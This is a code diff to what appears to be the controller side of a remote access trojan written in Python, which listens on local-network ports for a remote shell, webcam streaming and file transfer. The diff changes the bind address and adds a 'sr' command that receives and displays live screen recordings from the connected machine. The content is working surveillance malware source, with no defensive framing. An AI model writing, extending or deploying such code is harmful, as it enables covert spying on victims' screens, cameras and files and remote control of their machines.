@@ -9,7 +9,7 @@ import threading
 
 init(autoreset=True)
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-soc.bind(('192.168.1.16', 5555))
+soc.bind(('192.168.1.12', 5555))
 print(Fore.GREEN + 'wait for connection ...')
 soc.listen(1)
 
@@ -53,7 +53,7 @@ def ulf(fname):
 
 def convert_byte_stream():
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	sock.bind(('192.168.1.16', 9999))
+	sock.bind(('192.168.1.12', 9999))
 	sock.listen(5)
 	connection = sock.accept()
 	tg = connection[0]
@@ -86,6 +86,42 @@ def convert_byte_stream():
 def stream_cam():
 	t = threading.Thread(target=convert_byte_stream)
 	t.start()
+
+def convert_byte_record():
+	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	sock.bind(('192.168.1.12', 9995))
+	sock.listen(5)
+	connection = sock.accept()
+	tg = connection[0]
+	ip = connection[1]
+
+	bdata = b""
+	pl_size = struct.calcsize("i")
+
+	while True:
+		while (len(bdata)) < pl_size:
+			packet = tg.recv(1024)
+			if not packet: break
+			bdata += packet
+
+		packed_msg_size = bdata[:pl_size]
+		bdata = bdata[pl_size:]
+		msg_size = struct.unpack("i", packed_msg_size)[0]
+		while len(bdata) < msg_size:
+			bdata += tg.recv(1024)
+		frame_data = bdata[:msg_size]
+		bdata = bdata[msg_size:]
+		frame = pickle.loads(frame_data)
+		cv2.imshow("Start Screen Recording . . .", frame)
+		key = cv2.waitKey(1)
+		if key == 27:
+			break
+	tg.close()
+	cv2.destroyAllwindows()
+
+def record():
+	t = threading.Thread(target=convert_byte_record)
+	t.start() #bro, i forgot to add () and that's make me search it for almost 40 minutes!
 
 def communicate_shell():
 	n = 0
@@ -125,6 +161,8 @@ def communicate_shell():
 					break 
 			_target.settimeout(None)
 			file.close()
+		elif command == 'sr': #new screen recording feature
+			record()
 		else:
 			done = data_accepted()
 			print(done)
